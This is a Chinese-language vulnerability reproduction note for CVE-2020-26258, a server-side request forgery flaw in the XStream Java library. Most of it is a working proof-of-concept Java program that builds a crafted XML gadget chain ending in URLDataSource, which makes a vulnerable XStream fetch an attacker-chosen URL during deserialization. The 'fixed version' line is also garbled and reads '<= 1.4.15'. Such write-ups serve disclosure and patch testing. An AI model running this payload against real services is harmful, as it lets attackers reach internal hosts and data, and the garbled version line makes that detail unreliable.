# XStream SSRF 反序列化漏洞 CVE-2020-26258

## 漏洞描述

Xstream 是 Java 类库，用来将对象序列化成 XML (JSON) 或反序列化为对象。XStream 是一款开源软件，允许在 BSD 许可证的许可下分发。

参考链接：

- https://raw.githubusercontent.com/jas502n/CVE-2020-26259/main/CVE_2020_26258.java

## 漏洞影响

影响版本：

```
Xstream < = 1.4.14
```

修复版本：

```
Xstream < = 1.4.15
```

## 漏洞复现

poc：

```
import com.thoughtworks.xstream.XStream;

/*
CVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling
with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host.
All versions until and including version 1.4.14
https://x-stream.github.io/CVE-2020-26258.html
Security framework of XStream not explicitly initialized, using predefined black list on your own risk.
*/

public class CVE_2020_26258 {
    public static void main(String[] args) {
        String ssrf_xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='javax.activation.URLDataSource'>\n" +
                "            <url>http://localhost:8989/internal/:</url>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xstream = new XStream();
        xstream.fromXML(ssrf_xml);
    }
}
```
